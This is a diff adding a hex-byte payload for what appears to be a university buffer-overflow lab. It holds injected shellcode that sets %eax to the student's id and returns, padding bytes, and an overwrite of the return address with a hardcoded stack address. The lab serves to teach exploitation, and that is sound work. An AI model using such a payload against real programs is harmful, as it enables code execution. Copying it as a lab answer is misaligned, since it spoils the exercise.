@@ -1,0 +1,10 @@
+68 df 11 40 00  		/* push return address onto stack */
+b8 7a 14 1b 5c  		/* change %eax to my id */
+c3 				/* return */
+00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00		/* fill in extra space in buffer */
+00 00 00 00 00 00 00 00		
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 3b 68 55 00 00 00 00		/* jump to top of stack (hardcoded) */
